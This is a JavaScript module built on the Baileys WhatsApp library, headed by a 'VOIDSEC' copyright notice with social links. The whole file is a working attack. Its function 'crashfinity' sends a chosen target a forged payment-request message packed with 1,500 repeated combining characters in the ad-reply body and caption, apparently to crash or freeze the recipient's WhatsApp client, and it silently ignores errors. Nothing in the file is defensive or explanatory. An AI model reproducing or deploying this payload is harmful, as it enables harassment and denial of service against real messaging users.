/*
 * © 2026 SeXyxeon (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://youtube.com/@voidsec7718
 * Instagram : sabir._7718
 * Telegram  : https://t.me/SABIR7718
 * GitHub    : https://github.com/SABIR7718
 * WhatsApp  : +91 73650 85213
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */


const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');


async function crashfinity(SYxS7, target) {
    try {
        const titleText = "HAI SALAM KENAL YAKK";
        const spamText = "ြ".repeat(1500);

        const fakePaymentPayload = {
            requestPaymentMessage: {
                currencyCodeIso4217: "IDR",
                requestFrom: target,
                expiryTimestamp: Date.now() + 8000,
                amount: {
                    value: 999999999,
                    offset: 100,
                    currencyCode: "IDR"
                },

                contextInfo: {
                    externalAdReply: {
                        title: titleText,
                        body: spamText,
                        mimetype: "audio/mpeg",
                        caption: spamText,
                        showAdAttribution: true,
                        sourceUrl: "https://t.me/zuckyyu",
                        thumbnailUrl: "https://files.catbox.moe/tlbp3k.jpg"
                    }
                }
            }
        };

        await SYxS7.relayMessage(
            target,
            fakePaymentPayload,
            {
                participant: { jid: target },
                messageId: null,
                userJid: target,
                quoted: null
            }
        );


    } catch (error) {
    }
}

module.exports = { crashfinity }